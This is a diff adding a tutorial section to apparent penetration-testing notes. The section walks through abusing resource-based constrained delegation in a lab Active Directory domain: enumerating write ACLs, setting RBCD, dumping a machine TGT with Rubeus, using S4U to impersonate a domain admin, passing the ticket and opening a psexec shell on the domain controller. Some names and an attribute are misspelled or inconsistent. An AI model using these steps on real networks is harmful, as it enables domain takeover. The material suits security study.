@@ -187,4 +187,66 @@ C:\Users\Alex> psexec.exe \\dc.dev.dhitalcorp.local cmd
 In case of resource based constrained delegation, the delegation is setup on target/backend server via `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. Meaning if web server needs to delegate credentials to backend database server, the delegation is setup on backend database server by database administrator or target service owner.
 
 ## Abuse
-To exploit resource based constrained delegation if we have WriteProperty, GenericWrite, GenericAll or WriteDacl over a computer object we can set `msDS-AllowedToActOnBehalfOfOtherIdentity` on that computer ourselves. We will also need like an admin privilege on a domain joined computer or ability to join a machine to domain. Suppose we have admin access on `workstation-1$` and GenericWrite on `dc$`. On dc$ we can configure `PrincipalsAllowedToDelegateToAccount` attribute which means `workstation-1$` can access any service as any user on `dc$`.
+To exploit resource based constrained delegation if we have WriteProperty, GenericWrite, GenericAll or WriteDacl over a computer object we can set `msDS-AllowedToActOnBehalfOfOtherIdentity` on that computer ourselves. We will also need like an admin privilege on a domain joined computer or ability to join a machine to domain. Suppose we have admin access on `workstation-1$` and GenericWrite on `dc$`. On dc$ we can configure `PrincipalsAllowedToDelegateToAccount` for workstation-1 which means `workstation-1$` can access any service as any user on `dc$`. We can then simply extract TGT of workstation-1$ use this TGT to request `S4U2Self` ticket for itself and `S4U2Proxy` ticket for dc$ computer on behalf of a domain administrator and use the final `S4U2Proxy` ticket to pass the ticket.
+
+### Identifying machines with write access
+We can use `Find-InterestingDomainACL` to find interesting ACLs
+```powershell
+C:\Users\Alex\Desktop> Find-InterestingDomainACL
+
+DistinguishedName           : CN=dc$,OU=Computers,DC=dev,DC=dhitalcorp,DC=local
+Name                        : dc$
+ObjectClass                 : computer
+IdentityReferenceName       : dev\wkstnAdmin
+ActiveDirectoryRights       : {GenericWrite}
+SecurityIdentifier          : S-1-5-21-569305411-121244042-2357301523-1120
+IsInherited                 : False
+InheritanceFlags            : None
+PropagationFlags            : None
+ObjectType                  : 00000000-0000-0000-c000-000000000009
+ObjectAceType               : AccessAllowed
+AccessControlType           : Allow
+AccessControlList           : {GenericWrite}
+
+DistinguishedName           : CN=dc$,OU=Computers,DC=dev,DC=dhitalcorp,DC=local
+Name                        : dc$
+ObjectClass                 : computer
+IdentityReferenceName       : DEV\IT Admins
+ActiveDirectoryRights       : {WriteProperty}
+SecurityIdentifier          : S-1-5-21-569305411-121244042-2357301523-1171
+IsInherited                 : False
+InheritanceFlags            : None
+PropagationFlags            : None
+ObjectType                  : 00000000-0000-0000-c000-000000000009
+ObjectAceType               : AccessAllowed
+AccessControlType           : Allow
+AccessControlList           : {WriteProperty}
+```
+Above we can see wkstnAdmin has GenericWrite on dc$ computer as well as IT Admins group has WriteProperty on dc$. We will be using wkstnAdmin for this case. Now suppose we have admin access on `wkstn-1$` computer. We can setup `msds-AllowedToDelegateOnBehalfOfOtherIdentity` atribute on dc$ for `workstation-1$` computer using PowerView.
+
+```
+C:\Users\Alex\Desktop> Set-DomainRBCD -Identity dc -DelegateFrom 'workstation-1$'
+```
+Check if RBCD has been succesfully set
+```
+C:\Users\Alex\Desktop> Get-DomainRBCD
+```
+Now extract TGT of workstation-1$ computer account
+```
+C:\Users\Alex\Desktop> .\Rubeus.exe triage
+C:\Users\Alex\Desktop> .\Rubeus.exe dump /luid:0x4e5 /service:krbtgt /nowrap
+```
+Using this TGT we perform s4u to get ST for itself s4u2self(workstation-1$) and s42proxy ST on behalf of alex(domain administrator) for dc$ computer
+
+```
+C:\Users\Alex\Desktop> Rubeus.exe s4u /user:workstation-1$ /impersonateuser:alex /msdsspn:host/dc.dev.dhitalcorp.local /ticket:eFnKuD3g5hjllhb5JTw== /nowrap
+```
+Grab the final S4U2Proxy ticket and save in a file then use with Rubeus pass the ticket attack.
+```
+C:\Users\Alex> echo <base64ServiceTicket> > C:\Users\Alex\Desktop\ticket.kirbi
+C:\Users\Alex> .\Rubeus.exe ptt /ticket:C:\Users\Alex\Desktop\ticket.kirbi
+```
+Access the dc via psexec
+```
+C:\Users\Alex\Desktop> psexec.exe \\dc.dev.dhitalcorp.local cmd
+```
